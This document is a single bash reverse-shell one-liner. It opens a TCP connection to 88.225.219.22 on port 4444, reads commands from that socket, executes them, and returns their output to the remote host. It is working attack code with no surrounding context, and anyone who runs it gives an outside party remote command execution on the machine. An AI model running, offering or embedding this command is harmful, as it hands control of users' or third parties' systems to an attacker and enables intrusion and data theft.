exec 5<>/dev/tcp/88.225.219.22/4444;cat <&5 | while read line; do $line 2>&5 >&5; done
